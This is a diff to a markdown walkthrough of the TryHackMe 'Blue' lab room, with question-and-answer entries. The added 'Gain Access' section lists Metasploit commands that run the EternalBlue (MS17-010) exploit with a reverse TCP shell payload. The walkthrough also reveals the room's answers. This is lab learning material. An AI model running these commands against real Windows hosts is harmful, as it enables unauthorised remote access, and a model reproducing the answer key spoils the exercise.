@@ -4,7 +4,7 @@ Room URL: https://tryhackme.com/room/blue
 
 # Recon
 
-**Quesions:**
+**Questions:**
 
 **Q1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)**
 
@@ -144,3 +144,32 @@ Ans: ***3***
 **Q3.What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)**
 
 Ans: ***ms17-010***
+
+
+# Gain Access
+
+**Questions:**
+
+**Q1.Start Metasploit**
+
+`msfconsole`
+
+Ans: ***No answer needed***
+
+**Q2.Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**
+
+`search ms17-010`
+
+`use exploit/windows/smb/ms17_010_eternalblue`
+
+`set rhosts <target ip>`
+
+`set lhost <your machine ip>`
+
+`set payload windows/x64/shell/reverse_tcp`
+
+`run`
+
+![show-options-eternalblue](https://github.com/user-attachments/assets/1a526898-d601-4b3b-8ea5-59b0ce1d4837)
+
+Ans: ***No answer needed***
